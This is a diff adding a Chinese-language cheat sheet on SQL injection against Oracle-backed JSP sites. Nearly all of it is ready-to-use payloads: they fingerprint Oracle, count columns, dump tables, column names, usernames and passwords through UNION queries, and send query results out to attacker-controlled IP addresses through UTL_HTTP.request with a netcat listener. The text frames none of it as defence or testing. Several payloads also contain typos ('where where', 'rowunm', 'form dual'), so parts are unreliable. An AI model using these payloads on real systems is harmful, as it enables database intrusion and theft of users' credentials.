@@ -1,0 +1,235 @@
+Oracle SQL注射总结
+
+判断oracle数据库
+and (select count(*) from user_tables)>0--
+and (select count(*) from dual)>0--
+
+
+xx.jsp?id=1;返回错误继续
+xx.jsp?id=1--返回正常继续
+
+xx.jsp?id=1/*返回错误
+xx.jsp?id=1 and exists(select * from dual)--
+
+满足上面条件就可以确定是oracle
+
+
+
+
+判断数据库：
+
+单引号，报错，若是带错误回显，通常会有oracle字样。
+
+进一步判断注射点
+
+jsp?id=89 and 1=1 '返回正常 
+
+jsp?id=89 and 1=2 '返回错误。
+
+字符型判断：
+
+jsp?name=test ' and ''||'1'=1  '返回正常。
+
+jsp?name=test ' and ''||'1'=2 '返回错误。
+
+确定显示字段的位置：
+
+jsp?id=89 order by 5 '返回正常  
+
+jsp?id=89 order by 6 '返回错误  则确定当前有5个字段。
+
+之后使用null来匹配任意数据类型。构造union语句：
+
+jsp?id=89 and 1=2 union select null,null,null,null,null from dual--
+
+继续在null前后加上''引号来判断数据类型，返回正常说明为字符型，
+
+错误为数字型，假设1，3为数值型，其他为字符型，则可构造链接：
+
+jsp?id=89 and 1=2 union select 1,'2',3,'4',5 from dual--
+
+此时页面上显示出数字。
+
+爆表
+and 1=2 union select 1,'2',3,'4',（select table_name from user_tables where rownum=1) from dual--   爆出 KEIO
+继续爆
+and 1=2 union select 1,'2',3,'4',（select table_name from user_tables where rownum=1 and table_name<>'KEIO') from dual--
+依此类推
+
+爆KEIO的字段
+and 1=2 union select 1,'2',3,'4',（select column_name from user_tab_columns where where table_name='KEIO' and rownum=1) from dual--  得到username
+爆KEIO的字段
+and 1=2 union select 1,'2',3,'4',（select column_name from user_tab_columns where where table_name='KEIO' and column_name<>'username' and rownum=1) from dual-- 得到passwrod
+
+爆内容
+and 1=2 union select username,'2',3,'4',password from KEIO--
+
+
+2. UTL_HTTP存储过程反弹注入攻击
+
+判读UTL_HTTP存储过程是否可用
+and exists(select count(*) from all_objects where object_name='UTL_HTTP')
+正常 说明可以
+
+本地监听端口
+nc -vv -l -p 8888
+
+and UTL_HTTP.request('http://202.98.198.168:8888'||(select banner from sys.v_$version where rowunm=1))=1--
+
+查询一次需要断开一次nc  在继续监听
+
+and UTL_HTTP.request('http://202.98.198.168:8888'||(select owner from all_tables where rowunm=1))=1--  得到第一个数据库名 KEIO
+
+
+创建java函数运行runcmd
+
+
+
+
+
+union爆数据：
+
+确定字段位置之后可以显示出我们想要的数据，一些非常重要的信息：
+
+当前用户权限： (select * from session_roles)
+
+当前数据库版本：(select banner from sys.v$version where rownum=1)
+
+服务器监听ip (select utl_inaddr.grt_host_address form dual)
+
+服务器操作系统 (select member from v$logfile where rownum=1)
+
+当前连接用户 (select sys_context('userenv','current_user') from dual )
+
+example(查看数据库版本):
+
+jsp?id=89 and 1=2 union select 1,'2',(select banner from sys.v$version where rownum=1),'4','5' from dual--
+
+other information:
+
+jsp?id=89 and 1=2 union select 1,'2',table_name,'4','5' from user_tables-- 爆表
+
+假设含有adminuser表，则猜字段语句：
+
+jsp?id=89 and 1=2 union select 1,'2',column_name,'4','5' from databasename where table_name='adminuser'--
+
+之后是爆数据了：
+
+例如含有username and password，则构造语句：
+
+jsp?id=89 and 1=2 union select 1,'2',username,'4','5' from adminuser--
+
+jsp?id=89 and 1=2 union select 1,'2',password,'4','5' from adminuser--
+
+爆出后，数据将在网页中显示出来。
+
+若数据中含有多用户，则可使用where语句。
+
+example：
+
+jsp?id=89 and 1=2 union select 1,'2',password,'4','5' from adminuser where id=2--
+
+other:
+
+爆数据库版本
+
+union select 1,(select banner from sys.v_$version where rownum=1),3,4,5,6,7 from dual 
+
+判断当前连接用户
+
+union select 1,(select sys_context('userenv','current_user' from dual)),3,4,5,6,7 from dual 
+
+获得操作系统版本
+
+union select 1,(select member from v$logfile where rownum=1),3,4,5,6,7 from dual
+
+查看服务器sid
+
+union select 1,(select instance_name from v$instance),3,4,5,6,7 from dual
+
+爆表
+
+union select 1,table_name,3,4,5,6,7 from user_tables 可能表比较多，所以长度有要求，有些时候可能因为长度不够有些表没有显示出来
+
+爆字段
+
+union select 1,column_name,3,4,5,6,7 from cols where table_name=NEWS_ADMIN--
+
+爆字段内容
+
+union select 1,username,3,4,5,6,7 from admin 
+
+union select 1,password,3,4,5,6,7 from admin 当然也可以使用concat(),每个人的习惯不一样罢了
+
+第二种方法配合utl_http存储过程
+
+and UTL_HTTP.request('外网ip:port/'||(sql语句))=1--
+
+如果想检测一下UTL_HTTP包是否存在可以使用语句
+
+and (select count(*) from all_objects where object_name='UTL_HTTP')>0--
+
+本地先 nc -l -vv -p 2009，然后提交
+
+and UTL_HTTP.request('http://222.183.39.178:2009/'||(select banner from sys.v_$version where rownum=1))=1-- 
+
+成功返回数据库的版本 
+
+爆数据库名
+
+and UTL_HTTP.request('http://222.183.39.178:2006/'||(select name from v$database where rownum=1))=1--
+
+爆操作系统版本
+
+and UTL_HTTP.request('http://222.183.39.178:2009/'||(select member from v$logfile where rownum=1))=1--
+
+爆服务器sid 
+
+and UTL_HTTP.request('http://222.183.39.178:2009/'||(select instance_name from v$instance where rownum=1))=1--
+
+现在我们就来一点一点的爆。先爆库，再爆表，再爆字段
+
+and UTL_HTTP.request('http://222.183.39.178:2009/'||(select owner from all_tables where rownum=1))=1--
+
+假设爆出第一个库的名字为SYS。继续爆第二个库名，提交 以此类推,爆出所有的库
+
+and UTL_HTTP.request('222.183.39.178:2006/'||(select owner from all_tables where owner<>'SYS' and rownum=1))=1--
+
+and UTL_HTTP.request('222.183.39.178:2006/'||(select owner from all_tables where owner<>'SYS' and owner<>'OUTLN'and rownum=1))=1--
+
+and UTL_HTTP.request('222.183.39.178:2006/'||(select owner from all_tables where owner<>'SYS' and owner<>'OUTLN' and owner<>'SYSTEM' and rownum=1))=1--
+
+爆表语句如下 
+
+and UTL_HTTP.request('http://222.183.39.178:2009/'||(select TABLE_NAME from all_tables where owner='SYS'and rownum=1))=1--
+
+SYS库中第一个表为xxx。继续提交 
+
+and UTL_HTTP.request('http://222.183.39.178:2009/'||(select TABLE_NAME from all_tables where owner='SYS'and rownum=1 and TABLE_NAME<>'xxx'))=1--
+
+and UTL_HTTP.request('222.183.39.178:2006/'||(select TABLE_NAME from all_tables where owner='库名'and rownum=1 and TABLE_NAME<>'表名1' and TABLE_NAME<>'表名2'))=1--
+
+以此类推爆出SYS库中所有的表；如果需要爆表里有多少个列可以用 
+
+and UTL_HTTP.request('http://222.183.39.178:2009/'||(select count(*) from user_tab_columns where table_name='表名'))=1--
+
+或者想要爆第一个列名可以使用 
+
+and UTL_HTTP.request('222.183.39.178:2006/'||(select COLUMN_NAME from user_tab_columns where table_name='表名' and rownum=1))=1--
+
+爆第二个列名使用 
+
+and UTL_HTTP.request('222.183.39.178:2006/'||(select COLUMN_NAME from user_tab_columns where table_name='表名' and rownum=1 and COLUMN_NAME<>'第一个爆出的列名'))=1--
+
+and UTL_HTTP.request('222.183.39.178:2006/'||(select COLUMN_NAME from user_tab_columns where table_name='表名' and rownum=1 and COLUMN_NAME<>'第一个爆出的列名' and COLUMN_NAME<>'第二个爆出的列名'))=1--
+
+以此类推就可以爆出所有的列名。现在我们继续爆用户和密码，提交 
+
+and UTL_HTTP.request('http://222.183.39.178:2009/'||(select 字段名1 from TBL_USER_MANAGER_BASE where rownum=1))=1--
+
+爆密码提交 
+
+and UTL_HTTP.request ('http://222.183.39.178:2009/'||(select PASSWORD from TBL_USER_MANAGER_BASE where rownum=1))=1--
+
+and UTL_HTTP.request('222.183.39.178:2006/'||(select 列名 from 表名 where rownum=1 and 列名<>'第一个值' and 列名<>'第二个值'))=1--
+
